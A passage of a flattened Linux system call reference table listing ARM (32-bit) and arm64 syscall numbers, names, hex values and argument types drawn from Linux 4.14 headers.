msgbuf *msgp size_t msgsz int msgflg - - 302 msgrcv man/ cs/ 0x12e int msqid struct msgbuf *msgp size_t msgsz long msgtyp int msgflg - 303 msgget man/ cs/ 0x12f key_t key int msgflg - - - - 304 msgctl man/ cs/ 0x130 int msqid int cmd struct msqid_ds *buf - - - 305 shmat man/ cs/ 0x131 int shmid char *shmaddr int shmflg - - - 306 shmdt man/ cs/ 0x132 char *shmaddr - - - - - 307 shmget man/ cs/ 0x133 key_t key size_t size int flag - - - 308 shmctl man/ cs/ 0x134 int shmid int cmd struct shmid_ds *buf - - - 309 add_key man/ cs/ 0x135 const char *_type const char *_description const void *_payload size_t plen key_serial_t destringid - 310 request_key man/ cs/ 0x136 const char *_type const char *_description const char *_callout_info key_serial_t destringid - - 311 keyctl man/ cs/ 0x137 int cmd unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 312 semtimedop man/ cs/ 0x138 int semid struct sembuf *sops unsigned nsops const struct __kernel_timespec *timeout - - 313 vserver man/ cs/ 0x139 ? ? ? ? ? ? 314 ioprio_set man/ cs/ 0x13a int which int who int ioprio - - - 315 ioprio_get man/ cs/ 0x13b int which int who - - - - 316 inotify_init man/ cs/ 0x13c - - - - - - 317 inotify_add_watch man/ cs/ 0x13d int fd const char *path u32 mask - - - 318 inotify_rm_watch man/ cs/ 0x13e int fd __s32 wd - - - - 319 mbind man/ cs/ 0x13f unsigned long start unsigned long len unsigned long mode const unsigned long *nmask unsigned long maxnode unsigned flags 320 get_mempolicy man/ cs/ 0x140 int *policy unsigned long *nmask unsigned long maxnode unsigned long addr unsigned long flags - 321 set_mempolicy man/ cs/ 0x141 int mode const unsigned long *nmask unsigned long maxnode - - - 322 openat man/ cs/ 0x142 int dfd const char *filename int flags umode_t mode - - 323 mkdirat man/ cs/ 0x143 int dfd const char * pathname umode_t mode - - - 324 mknodat man/ cs/ 0x144 int dfd const char * filename umode_t mode unsigned dev - - 325 fchownat man/ cs/ 0x145 int dfd const char *filename uid_t user gid_t group int flag - 326 futimesat man/ cs/ 0x146 int dfd const char *filename struct timeval *utimes - - - 327 fstatat64 man/ cs/ 0x147 int dfd const char *filename struct stat64 *statbuf int flag - - 328 unlinkat man/ cs/ 0x148 int dfd const char * pathname int flag - - - 329 renameat man/ cs/ 0x149 int olddfd const char * oldname int newdfd const char * newname - - 330 linkat man/ cs/ 0x14a int olddfd const char *oldname int newdfd const char *newname int flags - 331 symlinkat man/ cs/ 0x14b const char * oldname int newdfd const char * newname - - - 332 readlinkat man/ cs/ 0x14c int dfd const char *path char *buf int bufsiz - - 333 fchmodat man/ cs/ 0x14d int dfd const char * filename umode_t mode - - - 334 faccessat man/ cs/ 0x14e int dfd const char *filename int mode - - - 335 pselect6 man/ cs/ 0x14f int fd_set * fd_set * fd_set * struct __kernel_timespec * void * 336 ppoll man/ cs/ 0x150 struct pollfd * unsigned int struct __kernel_timespec * const sigset_t * size_t - 337 unshare man/ cs/ 0x151 unsigned long unshare_flags - - - - - 338 set_robust_list man/ cs/ 0x152 struct robust_list_head *head size_t len - - - - 339 get_robust_list man/ cs/ 0x153 int pid struct robust_list_head head_ptr size_t *len_ptr - - - 340 splice man/ cs/ 0x154 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 341 arm_sync_file_range man/ cs/ 0x155 ? ? ? ? ? ? 341 sync_file_range2 man/ cs/ 0x155 int fd unsigned int flags loff_t offset loff_t nbytes - - 342 tee man/ cs/ 0x156 int fdin int fdout size_t len unsigned int flags - - 343 vmsplice man/ cs/ 0x157 int fd const struct iovec *iov unsigned long nr_segs unsigned int flags - - 344 move_pages man/ cs/ 0x158 pid_t pid unsigned long nr_pages const void pages const int *nodes int *status int flags 345 getcpu man/ cs/ 0x159 unsigned *cpu unsigned *node struct getcpu_cache *cache - - - 346 epoll_pwait man/ cs/ 0x15a int epfd struct epoll_event *events int maxevents int timeout const sigset_t *sigmask size_t sigsetsize 347 kexec_load man/ cs/ 0x15b unsigned long entry unsigned long nr_segments struct kexec_segment *segments unsigned long flags - - 348 utimensat man/ cs/ 0x15c int dfd const char *filename struct __kernel_timespec *utimes int flags - - 349 signalfd man/ cs/ 0x15d int ufd sigset_t *user_mask size_t sizemask - - - 350 timerfd_create man/ cs/ 0x15e int clockid int flags - - - - 351 eventfd man/ cs/ 0x15f unsigned int count - - - - - 352 fallocate man/ cs/ 0x160 int fd int mode loff_t offset loff_t len - - 353 timerfd_settime man/ cs/ 0x161 int ufd int flags const struct __kernel_itimerspec *utmr struct __kernel_itimerspec *otmr - - 354 timerfd_gettime man/ cs/ 0x162 int ufd struct __kernel_itimerspec *otmr - - - - 355 signalfd4 man/ cs/ 0x163 int ufd sigset_t *user_mask size_t sizemask int flags - - 356 eventfd2 man/ cs/ 0x164 unsigned int count int flags - - - - 357 epoll_create1 man/ cs/ 0x165 int flags - - - - - 358 dup3 man/ cs/ 0x166 unsigned int oldfd unsigned int newfd int flags - - - 359 pipe2 man/ cs/ 0x167 int *fildes int flags - - - - 360 inotify_init1 man/ cs/ 0x168 int flags - - - - - 361 preadv man/ cs/ 0x169 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 362 pwritev man/ cs/ 0x16a unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 363 rt_tgsigqueueinfo man/ cs/ 0x16b pid_t tgid pid_t pid int sig siginfo_t *uinfo - - 364 perf_event_open man/ cs/ 0x16c struct perf_event_attr *attr_uptr pid_t pid int cpu int group_fd unsigned long flags - 365 recvmmsg man/ cs/ 0x16d int fd struct mmsghdr *msg unsigned int vlen unsigned flags struct __kernel_timespec *timeout - 366 accept4 man/ cs/ 0x16e int struct sockaddr * int * int - - 367 fanotify_init man/ cs/ 0x16f unsigned int flags unsigned int event_f_flags - - - - 368 fanotify_mark man/ cs/ 0x170 int fanotify_fd unsigned int flags u64 mask int fd const char *pathname - 369 prlimit64 man/ cs/ 0x171 pid_t pid unsigned int resource const struct rlimit64 *new_rlim struct rlimit64 *old_rlim - - 370 name_to_handle_at man/ cs/ 0x172 int dfd const char *name struct file_handle *handle int *mnt_id int flag - 371 open_by_handle_at man/ cs/ 0x173 int mountdirfd struct file_handle *handle int flags - - - 372 clock_adjtime man/ cs/ 0x174 clockid_t which_clock struct __kernel_timex *tx - - - - 373 syncfs man/ cs/ 0x175 int fd - - - - - 374 sendmmsg man/ cs/ 0x176 int fd struct mmsghdr *msg unsigned int vlen unsigned flags - - 375 setns man/ cs/ 0x177 int fd int nstype - - - - 376 process_vm_readv man/ cs/ 0x178 pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 377 process_vm_writev man/ cs/ 0x179 pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 378 kcmp man/ cs/ 0x17a pid_t pid1 pid_t pid2 int type unsigned long idx1 unsigned long idx2 - 379 finit_module man/ cs/ 0x17b int fd const char *uargs int flags - - - 380 sched_setattr man/ cs/ 0x17c pid_t pid struct sched_attr *attr unsigned int flags - - - 381 sched_getattr man/ cs/ 0x17d pid_t pid struct sched_attr *attr unsigned int size unsigned int flags - - 382 renameat2 man/ cs/ 0x17e int olddfd const char *oldname int newdfd const char *newname unsigned int flags - 383 seccomp man/ cs/ 0x17f unsigned int op unsigned int flags void *uargs - - - 384 getrandom man/ cs/ 0x180 char *buf size_t count unsigned int flags - - - 385 memfd_create man/ cs/ 0x181 const char *uname_ptr unsigned int flags - - - - 386 bpf man/ cs/ 0x182 int cmd union bpf_attr *attr unsigned int size - - - 387 execveat man/ cs/ 0x183 int dfd const char *filename const char const argv const char const envp int flags - 388 userfaultfd man/ cs/ 0x184 int flags - - - - - 389 membarrier man/ cs/ 0x185 int cmd int flags - - - - 390 mlock2 man/ cs/ 0x186 unsigned long start size_t len int flags - - - 391 copy_file_range man/ cs/ 0x187 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 392 preadv2 man/ cs/ 0x188 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 393 pwritev2 man/ cs/ 0x189 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 394 pkey_mprotect man/ cs/ 0x18a unsigned long start size_t len unsigned long prot int pkey - - 395 pkey_alloc man/ cs/ 0x18b unsigned long flags unsigned long init_val - - - - 396 pkey_free man/ cs/ 0x18c int pkey - - - - - 397 statx man/ cs/ 0x18d int dfd const char *path unsigned flags unsigned mask struct statx *buffer - 983041 ARM_breakpoint man/ cs/ 0xf0001 ? ? ? ? ? ? 983042 ARM_cacheflush man/ cs/ 0xf0002 ? ? ? ? ? ? 983043 ARM_usr26 man/ cs/ 0xf0003 ? ? ? ? ? ? 983044 ARM_usr32 man/ cs/ 0xf0004 ? ? ? ? ? ? 983045 ARM_set_tls man/ cs/ 0xf0005 ? ? ? ? ? ? arm64 (64-bit)Compiled from Linux 4.14.0 headers. NR syscall name references %x8 arg0 (%x0) arg1 (%x1) arg2 (%x2) arg3 (%x3) arg4 (%x4) arg5 (%x5) 0 io_setup man/ cs/ 0x00 unsigned nr_reqs aio_context_t *ctx - - - - 1 io_destroy man/ cs/ 0x01 aio_context_t ctx - - - - - 2 io_submit man/ cs/ 0x02 aio_context_t long struct iocb - - - 3 io_cancel man/ cs/ 0x03 aio_context_t ctx_id struct iocb *iocb struct io_event *result - - - 4 io_getevents man/ cs/ 0x04 aio_context_t ctx_id long min_nr long nr struct io_event *events struct __kernel_timespec *timeout - 5 setxattr man/ cs/ 0x05 const char *path const char *name const void *value size_t size int flags - 6 lsetxattr man/ cs/ 0x06 const char *path const char *name const void *value size_t size int flags - 7 fsetxattr man/ cs/ 0x07 int fd const char *name const void *value size_t size int flags - 8 getxattr man/ cs/ 0x08 const char *path const char *name void *value size_t size - - 9 lgetxattr man/ cs/ 0x09 const char *path const char *name void *value size_t size - - 10 fgetxattr man/ cs/ 0x0a int fd const char *name void *value size_t size - - 11 listxattr man/ cs/ 0x0b const char *path char *list size_t size - - - 12 llistxattr man/ cs/ 0x0c const char *path char *list size_t size - - - 13 flistxattr man/ cs/ 0x0d int fd char *list size_t size - - - 14 removexattr man/ cs/ 0x0e const char *path const char *name - - - - 15 lremovexattr man/ cs/ 0x0f const char *path const char *name - - - - 16 fremovexattr man/ cs/ 0x10 int fd const char *name - - - - 17 getcwd man/ cs/ 0x11 char *buf unsigned long size - - - - 18 lookup_dcookie man/ cs/ 0x12 u64 cookie64 char *buf size_t len - - - 19 eventfd2 man/ cs/ 0x13 unsigned int count int flags - - - - 20 epoll_create1 man/ cs/ 0x14 int flags - - - - - 21 epoll_ctl man/ cs/ 0x15 int epfd int op int fd struct epoll_event *event - - 22 epoll_pwait man/ cs/ 0x16 int epfd struct epoll_event *events int maxevents int timeout const sigset_t *sigmask size_t sigsetsize 23 dup man/ cs/ 0x17 unsigned int fildes - - - - - 24 dup3 man/ cs/ 0x18 unsigned int oldfd unsigned int newfd int flags - - - 25 fcntl man/ cs/ 0x19 unsigned int fd unsigned int cmd unsigned long arg - - - 26 inotify_init1 man/ cs/ 0x1a int flags - - - - - 27 inotify_add_watch man/ cs/ 0x1b int fd const char *path u32 mask - - - 28 inotify_rm_watch man/ cs/ 0x1c int fd __s32 wd - - - - 29 ioctl man/ cs/ 0x1d unsigned int fd unsigned int cmd unsigned long arg - - - 30 ioprio_set man/ cs/ 0x1e int which int who int ioprio - - - 31 ioprio_get man/ cs/ 0x1f int which int who - - - - 32 flock man/ cs/ 0x20 unsigned int fd unsigned int cmd - - - - 33 mknodat man/ cs/ 0x21 int dfd const char * filename umode_t mode unsigned dev - - 34 mkdirat man/ cs/ 0x22 int dfd const char * pathname umode_t mode - - - 35 unlinkat man/ cs/ 0x23 int dfd const char * pathname int flag - - - 36 symlinkat man/ cs/ 0x24 const char * oldname int newdfd const char * newname - - - 37 linkat man/ cs/ 0x25 int olddfd const char *oldname int newdfd const char *newname int flags - 38 renameat man/ cs/ 0x26 int olddfd const char * oldname int newdfd const char * newname - - 39 umount2 man/ cs/ 0x27 ? ? ? ? ? ? 40 mount man/ cs/ 0x28 char *dev_name char *dir_name char *type unsigned long flags void *data - 41 pivot_root man/ cs/ 0x29 const char *new_root const char *put_old - - - - 42 nfsservctl man/ cs/ 0x2a ? ? ? ? ? ? 43 statfs man/ cs/ 0x2b const char * path struct statfs *buf - - - - 44 fstatfs man/ cs/ 0x2c unsigned int fd struct statfs *buf - - - - 45 truncate man/ cs/ 0x2d const char *path long length - - - - 46 ftruncate man/ cs/ 0x2e unsigned int fd unsigned long length - - - - 47 fallocate man/ cs/ 0x2f int fd int mode loff_t offset loff_t len - - 48 faccessat man/ cs/ 0x30 int dfd const char *filename int mode - - - 49 chdir man/ cs/ 0x31 const char *filename - - - - - 50 fchdir man/ cs/ 0x32 unsigned int fd - - - - - 51 chroot man/ cs/ 0x33 const char *filename - - - - - 52 fchmod man/ cs/ 0x34 unsigned int fd umode_t mode - - - - 53 fchmodat man/ cs/ 0x35 int dfd const char * filename umode_t mode - - - 54 fchownat man/ cs/ 0x36 int dfd const char *filename uid_t user gid_t group int flag - 55 fchown man/ cs/ 0x37 unsigned int fd uid_t user gid_t group - - - 56 openat man/ cs/ 0x38 int dfd const char *filename int flags umode_t mode - - 57 close man/ cs/ 0x39 unsigned int fd - - - - - 58 vhangup man/ cs/ 0x3a - - - - - - 59 pipe2 man/ cs/ 0x3b int *fildes int flags - - - - 60 quotactl man/ cs/ 0x3c unsigned int cmd const char *special qid_t id void *addr - - 61 getdents64 man/ cs/ 0x3d unsigned int fd struct linux_dirent64 *dirent unsigned int count - - - 62 lseek man/ cs/ 0x3e unsigned int fd off_t offset unsigned int whence - - - 63 read man/ cs/ 0x3f unsigned int fd char *buf size_t count - - - 64 write man/ cs/ 0x40 unsigned int fd const char *buf size_t count - - - 65 readv man/ cs/ 0x41 unsigned long fd const struct iovec *vec unsigned long vlen - - - 66 writev man/ cs/ 0x42 unsigned long fd const struct iovec *vec unsigned long vlen - - - 67 pread64 man/ cs/ 0x43 unsigned int fd char *buf size_t count loff_t pos - - 68 pwrite64 man/ cs/ 0x44 unsigned int fd const char *buf size_t count loff_t pos - - 69 preadv man/ cs/ 0x45 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 70 pwritev man/ cs/ 0x46 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 71 sendfile man/ cs/ 0x47 int out_fd int in_fd off_t *offset size_t count - - 72 pselect6 man/ cs/ 0x48 int fd_set * fd_set * fd_set * struct __kernel_timespec * void * 73 ppoll man/ cs/ 0x49 struct pollfd * unsigned int struct __kernel_timespec * const sigset_t * size_t - 74 signalfd4 man/ cs/ 0x4a int ufd sigset_t *user_mask size_t sizemask int flags - - 75 vmsplice man/ cs/ 0x4b int fd const struct iovec *iov unsigned long nr_segs unsigned int flags - - 76 splice man/ cs/ 0x4c int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 77 tee man/ cs/ 0x4d int fdin int fdout size_t len unsigned int flags - - 78 readlinkat man/ cs/ 0x4e int dfd const char *path char *buf int bufsiz - - 79 newfstatat man/ cs/ 0x4f int dfd const char *filename struct stat *statbuf int flag - - 80 fstat man/ cs/ 0x50 unsigned int fd struct __old_kernel_stat *statbuf - - - - 81 sync man/ cs/ 0x51 - - - - - - 82 fsync man/ cs/ 0x52 unsigned int fd - - - - - 83 fdatasync man/ cs/ 0x53 unsigned int fd - - - - - 84 sync_file_range man/ cs/ 0x54 int fd loff_t offset loff_t nbytes unsigned int flags - - 85 timerfd_create man/ cs/ 0x55 int clockid int flags - - - - 86 timerfd_settime man/ cs/ 0x56 int ufd int flags const struct __kernel_itimerspec *utmr struct __kernel_itimerspec *otmr - - 87 timerfd_gettime man/ cs/ 0x57 int ufd struct __kernel_itimerspec *otmr - - - - 88 utimensat man/ cs/ 0x58 int dfd const char *filename struct __kernel_timespec *utimes int flags - - 89 acct man/ cs/ 0x59 const char *name - - - - - 90 capget man/ cs/ 0x5a cap_user_header_t header cap_user_data_t dataptr - - - - 91 capset man/ cs/ 0x5b cap_user_header_t header const cap_user_data_t data - - - - 92 personality man/ cs/ 0x5c unsigned int personality - - - - - 93 exit man/ cs/ 0x5d int error_code - - - - - 94 exit_group man/ cs/ 0x5e int error_code - - - - - 95 waitid man/ cs/ 0x5f int which pid_t pid struct siginfo *infop int options struct rusage *ru - 96 set_tid_address man/ cs/ 0x60 int *tidptr - - - - - 97 unshare man/ cs/ 0x61 unsigned long unshare_flags - - - - - 98 futex man/ cs/ 0x62 u32 *uaddr int op u32 val struct __kernel_timespec *utime u32 *uaddr2 u32 val3 99 set_robust_list man/ cs/ 0x63 struct robust_list_head *head size_t len - - - - 100 get_robust_list man/ cs/ 0x64 int pid struct robust_list_head head_ptr size_t *len_ptr - - - 101 nanosleep man/ cs/ 0x65 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - - - 102 getitimer man/ cs/ 0x66 int which struct itimerval *value - - - - 103 setitimer man/ cs/ 0x67 int which struct itimerval *value struct itimerval *ovalue - - - 104 kexec_load man/ cs/ 0x68 unsigned long entry unsigned long nr_segments struct kexec_segment *segments unsigned long flags - - 105 init_module man/ cs/ 0x69 void *umod unsigned long len const char *uargs - - - 106 delete_module man/ cs/ 0x6a const char *name_user unsigned int flags - - - - 107 timer_create man/ cs/ 0x6b clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id - - - 108 timer_gettime man/ cs/ 0x6c timer_t timer_id struct __kernel_itimerspec *setting - - - - 109 timer_getoverrun man/ cs/ 0x6d timer_t timer_id - - - - - 110 timer_settime man/ cs/ 0x6e timer_t timer_id int flags const struct __kernel_itimerspec *new_setting struct __kernel_itimerspec *old_setting - - 111 timer_delete man/ cs/ 0x6f timer_t timer_id - - - - - 112 clock_settime man/ cs/ 0x70 clockid_t which_clock const struct __kernel_timespec *tp - - - - 113 clock_gettime man/ cs/ 0x71 clockid_t which_clock struct __kernel_timespec *tp - - - - 114 clock_getres man/ cs/ 0x72 clockid_t which_clock struct __kernel_timespec *tp - - - - 115 clock_nanosleep man/ cs/ 0x73 clockid_t which_clock int flags const struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - 116 syslog man/ cs/ 0x74 int type char *buf int len - - - 117 ptrace man/ cs/ 0x75 long request long pid unsigned long addr unsigned long data - - 118 sched_setparam man/ cs/ 0x76 pid_t pid struct sched_param *param - - - - 119 sched_setscheduler man/ cs/ 0x77 pid_t pid int policy struct sched_param *param - - - 120 sched_getscheduler man/ cs/ 0x78 pid_t pid - - - - - 121 sched_getparam man/ cs/ 0x79 pid_t pid struct sched_param *param - - - - 122 sched_setaffinity man/ cs/ 0x7a pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 123 sched_getaffinity man/ cs/ 0x7b pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 124 sched_yield man/ cs/ 0x7c - - - - - - 125 sched_get_priority_max man/ cs/ 0x7d int policy - - - - - 126 sched_get_priority_min man/ cs/ 0x7e int policy - - - - - 127 sched_rr_get_interval man/ cs/ 0x7f pid_t pid struct __kernel_timespec *interval - - - - 128 restart_syscall man/ cs/ 0x80 - - - - - - 129 kill man/ cs/ 0x81 pid_t pid int sig - - - - 130 tkill man/ cs/ 0x82 pid_t pid int sig - - - - 131 tgkill man/ cs/ 0x83 pid_t tgid pid_t pid int sig - - - 132 sigaltstack man/ cs/ 0x84 const struct sigaltstack *uss struct sigaltstack *uoss - - - - 133 rt_sigsuspend man/ cs/ 0x85 sigset_t *unewset size_t sigsetsize - - - - 134 rt_sigaction man/ cs/ 0x86 int const struct sigaction * struct sigaction * size_t - - 135 rt_sigprocmask man/ cs/ 0x87 int how sigset_t *set sigset_t *oset size_t sigsetsize - - 136 rt_sigpending man/ cs/ 0x88 sigset_t *set size_t sigsetsize - - - - 137 rt_sigtimedwait man/ cs/ 0x89 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts size_t sigsetsize - - 138 rt_sigqueueinfo man/ cs/ 0x8a pid_t pid int sig siginfo_t *uinfo - - - 139 rt_sigreturn man/ cs/ 0x8b ? ? ? ? ? ? 140 setpriority man/ cs/ 0x8c int which int who int niceval - - - 141 getpriority man/ cs/ 0x8d int which int who - - - - 142 reboot man/ cs/ 0x8e int magic1 int magic2 unsigned int cmd void *arg - - 143 setregid man/ cs/ 0x8f gid_t rgid gid_t egid - - - - 144 setgid man/ cs/ 0x90 gid_t gid - - - - - 145 setreuid man/ cs/ 0x91 uid_t ruid uid_t euid - - - - 146 setuid man/ cs/ 0x92 uid_t uid - - - - - 147 setresuid man/ cs/ 0x93 uid_t ruid uid_t euid uid_t suid - - - 148 getresuid man/ cs/ 0x94 uid_t *ruid uid_t *euid uid_t *suid - - - 149 setresgid man/ cs/ 0x95 gid_t rgid gid_t egid gid_t sgid - - - 150 getresgid man/ cs/ 0x96 gid_t *rgid gid_t *egid gid_t *sgid - - - 151 setfsuid man/ cs/ 0x97 uid_t uid - - - - - 152 setfsgid man/ cs/ 0x98 gid_t gid - - - - - 153 times man/ cs/ 0x99 struct tms *tbuf - - - - - 154 setpgid man/ cs/ 0x9a pid_t pid pid_t pgid - - - - 155 getpgid man/ cs/ 0x9b pid_t pid - - - - - 156 getsid man/ cs/ 0x9c pid_t pid - - - - - 157 setsid man/ cs/ 0x9d - - - - - - 158 getgroups man/ cs/ 0x9e int gidsetsize gid_t *grouplist - - - - 159 setgroups man/ cs/ 0x9f int gidsetsize gid_t *grouplist - - - - 160 uname man/ cs/ 0xa0 struct old_utsname * - - - - - 161 sethostname man/ cs/ 0xa1 char *name int len - - - - 162 setdomainname man/ cs/ 0xa2 char *name int len - - - - 163 getrlimit man/ cs/ 0xa3 unsigned int resource struct rlimit *rlim - - - - 164 setrlimit man/ cs/ 0xa4 unsigned int resource struct rlimit *rlim - - - - 165 getrusage man/ cs/ 0xa5 int who struct rusage *ru - - - - 166 umask man/ cs/ 0xa6 int mask - - - - - 167 prctl man/ cs/ 0xa7 int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 168 getcpu man/ cs/ 0xa8 unsigned *cpu unsigned *node struct getcpu_cache *cache - - - 169 gettimeofday man/ cs/ 0xa9 struct timeval *tv struct timezone *tz - - - - 170 settimeofday man/ cs/ 0xaa struct timeval *tv struct timezone *tz - - - - 171 adjtimex man/ cs/ 0xab struct __kernel_timex *txc_p - - - - - 172 getpid man/ cs/ 0xac - - - - - - 173 getppid man/ cs/ 0xad - - - - - - 174 getuid man/ cs/ 0xae - - - - - - 175 geteuid man/ cs/ 0xaf - - - - - - 176 getgid man/ cs/ 0xb0 - - - - - - 177 getegid man/ cs/ 0xb1 - - - - - - 178 gettid man/ cs/ 0xb2 - - - - - - 179 sysinfo man/ cs/ 0xb3 struct sysinfo *info - - - - - 180 mq_open man/ cs/ 0xb4 const char *name int oflag umode_t mode struct mq_attr *attr - - 181 mq_unlink man/ cs/ 0xb5 const char *name - - - - - 182 mq_timedsend man/ cs/ 0xb6 mqd_t mqdes const char *msg_ptr size_t msg_len unsigned int msg_prio const struct __kernel_timespec *abs_timeout - 183 mq_timedreceive man/ cs/ 0xb7 mqd_t mqdes char *msg_ptr size_t msg_len unsigned int *msg_prio const struct __kernel_timespec *abs_timeout - 184 mq_notify man/ cs/ 0xb8 mqd_t mqdes const struct sigevent *notification - - - - 185 mq_getsetattr man/ cs/ 0xb9 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat - - - 186 msgget man/ cs/ 0xba key_t key int msgflg - - - - 187 msgctl man/ cs/ 0xbb int msqid int cmd struct msqid_ds *buf - - - 188 msgrcv man/ cs/ 0xbc int msqid struct msgbuf *msgp size_t msgsz long msgtyp int msgflg - 189 msgsnd man/ cs/ 0xbd int msqid struct msgbuf *msgp size_t msgsz int msgflg - - 190 semget man/ cs/ 0xbe key_t key int nsems int semflg - - - 191 semctl man/ cs/ 0xbf int semid int semnum int cmd unsigned long arg - - 192 semtimedop man/ cs/ 0xc0 int semid struct sembuf *sops unsigned nsops const struct __kernel_timespec *timeout - - 193 semop man/ cs/ 0xc1 int semid struct sembuf *sops unsigned nsops - - - 194 shmget man/ cs/ 0xc2 key_t key size_t size int flag - - - 195 shmctl man/ cs/ 0xc3 int shmid int cmd struct shmid_ds *buf - - - 196 shmat man/ cs/ 0xc4 int shmid char *shmaddr int shmflg - - - 197 shmdt man/ cs/ 0xc5 char *shmaddr - - - - - 198 socket man/ cs/ 0xc6 int int int - - - 199 socketpair man/ cs/ 0xc7 int int int int * - - 200 bind man/ cs/ 0xc8 int struct sockaddr * int - - - 201 listen man/ cs/ 0xc9 int int - - - - 202 accept man/ cs/ 0xca int struct sockaddr * int * - - - 203 connect man/ cs/ 0xcb int struct sockaddr * int - - - 204 getsockname man/ cs/ 0xcc int struct sockaddr * int * - - - 205 getpeername man/ cs/ 0xcd int struct sockaddr * int * - - - 206 sendto man/ cs/ 0xce int void * size_t unsigned struct sockaddr * int 207 recvfrom man/ cs/ 0xcf int void * size_t unsigned struct sockaddr * int * 208 setsockopt man/ cs/ 0xd0 int fd int level int optname char *optval int optlen - 209 getsockopt man/ cs/ 0xd1 int fd int level int optname char *optval int *optlen - 210 shutdown man/ cs/ 0xd2 int int - - - - 211 sendmsg man/ cs/ 0xd3 int fd struct user_msghdr *msg unsigned flags - - - 212 recvmsg man/ cs/ 0xd4 int fd struct user_msghdr *msg unsigned flags - - - 213 readahead man/ cs/ 0xd5 int fd loff_t offset size_t count - - - 214 brk man/ cs/ 0xd6 unsigned long brk - - - - - 215 munmap man/ cs/ 0xd7 unsigned long addr size_t len - - - - 216 mremap man/ cs/ 0xd8 unsigned long addr unsigned long old_len unsigned long new_len unsigned long flags unsigned long new_addr - 217 add_key man/ cs/ 0xd9 const char *_type const char *_description const void *_payload size_t plen key_serial_t destringid - 218 request_key man/ cs/ 0xda const char *_type const char *_description const char *_callout_info key_serial_t destringid - - 219 keyctl man/ cs/ 0xdb int cmd unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 220 clone man/ cs/ 0xdc unsigned long unsigned long int * int * unsigned long - 221 execve man/ cs/ 0xdd const char *filename const char const argv const char const envp - - - 222 mmap man/ cs/ 0xde ? ? ? ? ? ? 223 fadvise64 man/ cs/ 0xdf int fd loff_t offset size_t len int advice - - 224 swapon man/ cs/ 0xe0 const char *specialfile int swap_flags - - - - 225 swapoff man/ cs/ 0xe1 const char *specialfile - - - - - 226 mprotect man/ cs/ 0xe2 unsigned long start size_t len unsigned long prot - - - 227 msync man/ cs/ 0xe3 unsigned long start size_t len int flags - - - 228 mlock man/ cs/ 0xe4 unsigned long start size_t len - - - - 229 munlock man/ cs/ 0xe5 unsigned long start size_t len - - - - 230 mlockall man/ cs/ 0xe6 int flags - - - - - 231 munlockall man/ cs/ 0xe7 - - - - - - 232 mincore man/ cs/ 0xe8 unsigned long start size_t len unsigned char * vec - - - 233 madvise man/ cs/ 0xe9 unsigned long start size_t len int behavior - - - 234 remap_file_pages man/ cs/ 0xea unsigned long start unsigned long size unsigned long prot unsigned long pgoff unsigned long flags - 235 mbind man/ cs/ 0xeb unsigned long start unsigned long len unsigned long mode const unsigned long *nmask unsigned long maxnode unsigned flags 236 get_mempolicy man/ cs/ 0xec int *policy unsigned long *nmask unsigned long maxnode unsigned long addr unsigned long flags - 237 set_mempolicy man/ cs/ 0xed int mode const unsigned long *nmask unsigned long maxnode - - - 238 migrate_pages man/ cs/ 0xee pid_t pid unsigned long maxnode const unsigned long *from const unsigned long *to - - 239 move_pages man/ cs/ 0xef pid_t pid unsigned long nr_pages const void pages const int *nodes int *status int flags 240 rt_tgsigqueueinfo man/ cs/ 0xf0 pid_t tgid pid_t pid int sig siginfo_t *uinfo - - 241 perf_event_open man/ cs/ 0xf1 struct perf_event_attr *attr_uptr pid_t pid int cpu int group_fd unsigned long flags - 242 accept4 man/ cs/ 0xf2 int struct sockaddr * int * int - - 243 recvmmsg man/ cs/ 0xf3 int fd struct mmsghdr *msg unsigned int vlen unsigned flags struct __kernel_timespec *timeout - 244 not implemented 0xf4 245 not implemented 0xf5 246 not implemented 0xf6 247 not implemented 0xf7 248 not implemented 0xf8 249 not implemented 0xf9 250 not implemented 0xfa 251 not implemented 0xfb 252 not implemented 0xfc 253 not implemented 0xfd 254 not implemented 0xfe 255 not implemented 0xff 256 not implemented 0x100 257 not implemented 0x101 258 not implemented 0x102 259 not implemented 0x103 260 wait4 man/ cs/ 0x104 pid_t pid int *stat_addr int options struct rusage *ru - - 261 prlimit64 man/ cs/ 0x105 pid_t pid unsigned int resource const struct rlimit64 *new_rlim struct rlimit64 *old_rlim - - 262 fanotify_init man/ cs/ 0x106 unsigned int flags unsigned int event_f_flags - - - - 263 fanotify_mark man/ cs/ 0x107 int fanotify_fd unsigned int flags u64 mask int fd const char *pathname - 264 name_to_handle_at man/ cs/ 0x108 int dfd const char *name struct file_handle *handle int *mnt_id int flag - 265 open_by_handle_at man/ cs/ 0x109 int mountdirfd struct file_handle *handle int flags - - - 266 clock_adjtime man/ cs/ 0x10a clockid_t which_clock struct __kernel_timex *tx - - - - 267 syncfs man/ cs/ 0x10b int fd - - - - - 268 setns man/ cs/ 0x10c int fd int nstype - - - - 269 sendmmsg man/ cs/ 0x10d int fd struct mmsghdr *msg unsigned int vlen unsigned flags - - 270 process_vm_readv man/ cs/ 0x10e pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 